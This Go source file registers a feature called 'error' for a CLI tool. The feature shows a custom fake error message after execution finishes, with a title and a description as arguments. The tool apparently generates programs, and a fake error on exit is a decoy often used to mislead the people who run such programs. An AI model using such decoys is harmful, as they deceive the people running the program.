package features

import (
	. "mk3cli/s7cli/commands"
	. "mk3cli/s7cli/features"
)

func init() {
	FeatureList = append(FeatureList, Feature{
		Name:        "error",
		Description: "Displays a custom fake error message when execution finishes",
		ReturnsData: false,
		Args: []Arg{
			{
				Name: Name{
					"title",
					"t",
				},
				Datatype: "string",
				Required: true,
			}, {
				Name: Name{
					"description",
					"d",
				},
				Datatype: "string",
				Required: true,
			},
		},
		Dependencies: []string{
			"system.lib.go",
		},
	})
}
